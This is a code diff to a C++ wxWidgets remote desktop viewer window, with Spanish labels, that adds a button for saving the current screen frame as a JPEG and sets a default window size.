@@ -11,10 +11,11 @@ wxBEGIN_EVENT_TABLE(frameRemoteDesktop, wxFrame)
 	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Single, frameRemoteDesktop::OnSingle)
 	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Start, frameRemoteDesktop::OnStart)
 	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Stop, frameRemoteDesktop::OnStop)
+	EVT_BUTTON(EnumRemoteDesktop::ID_BTN_Save, frameRemoteDesktop::OnSave)
 wxEND_EVENT_TABLE()
 
 frameRemoteDesktop::frameRemoteDesktop(wxWindow* pParent) :
-	wxFrame(pParent, EnumRemoteDesktop::ID_Main_Frame, "Escritorio Remoto", wxDefaultPosition, wxDefaultSize) {
+	wxFrame(pParent, EnumRemoteDesktop::ID_Main_Frame, "Escritorio Remoto", wxDefaultPosition, wxSize(600, 400)) {
 	//Crear controles en la parte superior
 	//  [Iniciar] [Detener]  [Guardar Captura]  [] CheckBox para controlar mouse y teclado
 	//  Resolution Fastest | Low | Medium | High
@@ -79,6 +80,15 @@ void frameRemoteDesktop::OnStop(wxCommandEvent&) {
 	strComando.append(1, CMD_DEL);
 	strComando.append(1, '0');
 	int iSent = p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+}
+
+void frameRemoteDesktop::OnSave(wxCommandEvent&) {
+	wxFileDialog dialog(this, "Guardar frame", wxEmptyString, "captura.jpg", wxFileSelectorDefaultWildcardStr, wxFD_SAVE | wxFD_OVERWRITE_PROMPT);
+	if (dialog.ShowModal() == wxID_OK) {
+		if (!this->imageCtrl->GetBitmap().SaveFile(dialog.GetPath(), wxBITMAP_TYPE_JPEG)) {
+			wxMessageBox("No se pudo guardar " + dialog.GetPath(), "Error", wxID_OK);
+		}
+	}
 }
 
 void frameRemoteDesktop::OnDrawBuffer(const char* cBuffer, int iBuffersize) {
